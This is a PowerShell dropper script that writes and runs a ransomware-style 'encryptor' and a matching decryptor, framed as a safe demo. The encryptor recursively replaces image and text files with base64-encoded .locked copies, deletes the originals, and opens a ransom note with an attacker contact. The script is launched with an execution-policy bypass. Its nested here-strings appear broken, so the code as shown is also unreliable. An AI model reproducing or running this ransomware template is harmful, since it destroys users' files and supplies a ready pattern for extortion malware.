# OVERWRITE setup.ps1 with the SAFE version
$safeDropper = @'
Write-Host "[*] Reprovisioning Safe Attack Tools..." -ForegroundColor Gray

# --- 1. THE SAFER ENCRYPTOR ---
$encCode = @'
param(
    [string]$Target = ".\", 
    [string]$SecretKey = "AI-DEMO-2026"
)
$ResolvedPath = (Resolve-Path $Target).Path
$ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"

Write-Host "[!] TARGET: $ResolvedPath" -ForegroundColor Red

# FIX: We now EXCLUDE the ransom note and already locked files
Get-ChildItem -Path $ResolvedPath -Include *.jpg,*.png,*.txt -Exclude "READ_ME_NOW.txt","*.locked" -Recurse | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encoded = [System.Convert]::ToBase64String($content)
    $encoded | Set-Content ($_.FullName + ".locked")
    Remove-Item $_.FullName
    Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
}

$noteContent = @"
YOUR FILES ARE ENCRYPTED.
TARGET: $ResolvedPath
KEY ID: $SecretKey
CONTACT: ATTACKER@DARKWEB.COM
"@
$noteContent | Set-Content $ransomNotePath
Start-Process notepad.exe $ransomNotePath
'@

# --- 2. THE DECRYPTOR ---
$decCode = @'
param(
    [string]$Key,
    [string]$Target = ".\"
)
$ResolvedPath = (Resolve-Path $Target).Path

if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Validated. Scanning $ResolvedPath..." -ForegroundColor Green
    Get-ChildItem -Path $ResolvedPath -Filter *.locked -Recurse | ForEach-Object {
        try {
            $encoded = Get-Content $_.FullName -ErrorAction Stop
            $decoded = [System.Convert]::FromBase64String($encoded)
            $originalName = $_.FullName.Replace(".locked", "")
            [System.IO.File]::WriteAllBytes($originalName, $decoded)
            Remove-Item $_.FullName
            Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
        } catch {
            Write-Host "[!] Skipping corrupted file: $($_.Name)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "[-] ACCESS DENIED. WRONG KEY." -ForegroundColor Red
}
'@

$encCode | Set-Content .\encrypt.ps1
$decCode | Set-Content .\decrypt.ps1
Write-Host "[+] Tools updated successfully." -ForegroundColor Green
'@

# Run the variable to write the file, then execute it
$safeDropper | Set-Content .\setup.ps1
powershell -ExecutionPolicy Bypass -File .\setup.ps1
